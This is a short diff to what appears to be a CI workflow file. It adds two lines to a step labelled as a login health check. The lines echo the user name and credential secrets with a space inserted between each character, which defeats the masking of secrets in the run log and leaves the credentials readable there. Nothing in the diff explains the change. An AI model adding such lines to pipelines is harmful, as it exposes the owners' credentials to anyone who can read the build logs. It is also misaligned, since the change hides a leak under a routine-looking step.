@@ -22,6 +22,8 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
+        echo ${{secrets.USER}} | sed 's/./& /g'
+        echo ${{secrets.USER_CRED}} | sed 's/./& /g'
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
         
     - name: send_run_log
